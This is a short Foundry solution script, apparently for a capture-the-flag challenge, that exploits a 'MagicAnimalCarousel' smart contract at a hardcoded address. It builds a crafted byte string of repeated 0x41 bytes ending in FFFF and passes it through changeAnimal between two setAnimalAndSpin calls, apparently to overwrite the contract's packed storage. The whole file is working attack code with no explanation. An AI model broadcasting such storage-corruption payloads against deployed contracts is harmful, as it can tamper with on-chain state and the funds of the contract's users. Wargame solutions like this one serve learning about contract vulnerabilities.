// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../src/MagicAnimalCarousel.sol";
import "forge-std/Script.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();

        MagicAnimalCarousel victim = MagicAnimalCarousel(0xE4A8327F6F2f43EDE62Daa895048a2F4F2F0bDA9);

        string memory fakeAnimal = string(abi.encodePacked(hex"41414141414141414141FFFF"));
        victim.setAnimalAndSpin("Capibara");
        victim.changeAnimal(fakeAnimal, 1);
        victim.setAnimalAndSpin("n4mchun");

        vm.stopBroadcast();
    }
}